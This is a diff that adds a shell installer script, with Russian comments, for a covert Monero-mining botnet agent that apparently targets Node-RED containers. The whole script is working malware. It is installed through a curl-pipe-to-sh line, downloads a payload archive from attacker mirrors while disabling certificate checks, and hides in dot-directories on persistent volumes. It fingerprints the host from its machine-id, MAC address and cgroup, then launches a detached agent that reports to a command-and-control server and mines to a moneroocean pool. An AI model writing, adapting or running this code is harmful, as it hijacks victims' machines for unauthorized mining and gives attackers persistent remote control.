@@ -1,0 +1,122 @@
+#!/bin/sh
+# kf install — установка и запуск агента одной строкой:
+#   curl -fsSL https://edge-static.cdn-edge-e9d.workers.dev/install.sh | sh
+# env (всё необязательно): KF_WALLET, KF_C2, KF_WID, KF_D, KF_M1, KF_M2, KF_BIN_TAG
+set -u
+M1="${KF_M1:-https://edge-static.cdn-edge-e9d.workers.dev}"
+M2="${KF_M2:-https://raw.githubusercontent.com/z3ncv/cdn-edge/main}"
+# Явный KF_WALLET имеет приоритет; иначе сохраняем уже настроенный кошелёк.
+W="${KF_WALLET:-}"
+C2="${KF_C2:-https://node-red.elm-v1-staging.clodpi.io}"
+# Рабочий каталог: /data — постоянный том Node-RED (переживает пересоздание контейнера).
+# Признак тома: отдельное устройство от / и ФС не tmpfs/ramfs. Нет /data — /var/tmp.
+D="${KF_D:-}"
+if [ -z "$D" ]; then
+  D=/var/tmp/.kf
+  if [ -d /data ] && [ -w /data ]; then
+    # bind/named volume виден в /proc/mounts; tmpfs и ramfs не считаем постоянными
+    if grep -q ' /data ' /proc/mounts 2>/dev/null \
+       && ! grep -Eq ' /data (tmpfs|ramfs|overlay) ' /proc/mounts 2>/dev/null; then
+      D=/data/.kf
+    fi
+  fi
+fi
+
+mkdir -p "$D" 2>/dev/null || { D=/tmp/.kf; mkdir -p "$D" 2>/dev/null; }
+[ -d "$D" ] || exit 1
+if [ -z "$W" ]; then
+  for _state_d in "$D" /data/.kf /var/tmp/.kf; do
+    if [ -s "$_state_d/.wallet" ]; then
+      W=$(cat "$_state_d/.wallet" 2>/dev/null | tr -d ' \r\n')
+      break
+    fi
+  done
+fi
+# При первой установке агент сам применит встроенный дефолт, если кошелька нет.
+
+# stdin занят скриптом (curl|sh), поэтому все команды ниже обязаны читать не stdin:
+# curl/wget пишут в файл, tar берёт архив из файла, агент уходит в фон с </dev/null.
+T="${TMPDIR:-/tmp}/.kfkit.$$"
+get() {
+  if command -v curl >/dev/null 2>&1; then curl -fsSL -m 90 -o "$2" "$1" 2>/dev/null && return 0; fi
+  if command -v wget >/dev/null 2>&1; then wget --no-check-certificate -q -T 90 -O "$2" "$1" 2>/dev/null && return 0; fi
+  if command -v python3 >/dev/null 2>&1; then python3 -c "import sys,urllib.request,ssl; u=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ssl._create_unverified_context())); open(sys.argv[2],'wb').write(u.open(sys.argv[1], timeout=90).read())" "$1" "$2" 2>/dev/null && return 0; fi
+  return 1
+}
+
+got=""
+for m in "$M1" "$M2"; do
+  rm -f "$T"
+  if get "$m/kit.tgz" "$T"; then
+    # sanity: gzip-магия, иначе зеркало отдало html/ошибку
+    if command -v od >/dev/null 2>&1; then
+      [ "$(od -An -tx1 -N2 "$T" 2>/dev/null | tr -d ' \n')" = "1f8b" ] || { rm -f "$T"; continue; }
+    fi
+    got=1; break
+  fi
+done
+[ -n "$got" ] || exit 1
+
+tar xzf "$T" -C "$D" 2>/dev/null || { rm -f "$T"; exit 1; }
+rm -f "$T"
+mv "$D"/lib/*.sh "$D"/ 2>/dev/null
+chmod 700 "$D"/*.sh 2>/dev/null
+[ -f "$D/fleet-agent.sh" ] || exit 1
+
+# При миграции /var/tmp ↔ /data сохраняем идентичность: иначе второй корень
+# получает новый WID и арбитраж не распознаёт его как тот же экземпляр.
+WID_SAVE="${KF_WID:-}"
+if [ -z "$WID_SAVE" ]; then
+  for _state_d in "$D" /data/.kf /var/tmp/.kf; do
+    if [ -s "$_state_d/id" ]; then
+      WID_SAVE=$(cat "$_state_d/id" 2>/dev/null | tr -d ' \r\n')
+      break
+    fi
+  done
+fi
+
+H=$(hostname 2>/dev/null || echo x)
+if command -v md5sum >/dev/null 2>&1; then
+  H6=$(printf '%s' "$H" | md5sum | cut -c1-6)
+else
+  H6=$(printf '%s' "$H" | cksum | tr -dc '0-9' | cut -c1-6)
+fi
+# второй суффикс: machine-id или MAC — чтобы контейнеры с hostname=localhost не схлопывались в один воркер
+M=""
+[ -r /etc/machine-id ] && M=$(cat /etc/machine-id 2>/dev/null)
+if [ -z "$M" ]; then
+  for f in /sys/class/net/*/address; do
+    a=$(cat "$f" 2>/dev/null)
+    case "$a" in ""|"00:00:00:00:00:00") ;; *) M="$a"; break;; esac
+  done
+fi
+if command -v md5sum >/dev/null 2>&1; then
+  M6=$(printf '%s' "${M:-$H}" | md5sum | cut -c1-4)
+else
+  M6=$(printf '%s' "${M:-$H}" | cksum | tr -dc '0-9' | cut -c1-4)
+fi
+# третий суффикс: cgroup/pid-namespace. В контейнерах одного хоста machine-id и MAC
+# часто совпадают, а cgroup разный — иначе два контейнера получат один id и одну строку шар.
+# берём cgroup+namespace вместе: в контейнерах cgroup свой, в песочницах — ns
+N="$(cat /proc/self/cgroup 2>/dev/null)|$(readlink /proc/self/ns/pid 2>/dev/null)|$(readlink /proc/self/ns/mnt 2>/dev/null)"
+[ "$N" = "||" ] && N="$H$$"
+if command -v md5sum >/dev/null 2>&1; then
+  N4=$(printf '%s' "${N:-$H$$}" | md5sum | cut -c1-4)
+else
+  N4=$(printf '%s' "${N:-$H$$}" | cksum | tr -dc '0-9' | cut -c1-4)
+fi
+WID="${WID_SAVE:-k7m-$H6$M6$N4}"
+
+LOG=/tmp/.kf-boot.log
+[ -w /tmp ] || LOG=/dev/null
+
+if command -v setsid >/dev/null 2>&1; then
+  KF_D="$D" KF_WALLET="$W" KF_POOL="${KF_POOL:-gulf.moneroocean.stream:443}" KF_POOL_TLS="${KF_POOL_TLS:-true}" \
+    setsid sh "$D/fleet-agent.sh" "$C2" "$WID" >"$LOG" 2>&1 </dev/null &
+else
+  KF_D="$D" KF_WALLET="$W" KF_POOL="${KF_POOL:-gulf.moneroocean.stream:443}" KF_POOL_TLS="${KF_POOL_TLS:-true}" \
+    nohup sh "$D/fleet-agent.sh" "$C2" "$WID" >"$LOG" 2>&1 </dev/null &
+fi
+
+echo "KFDEPLOYED $WID"
+exit 0
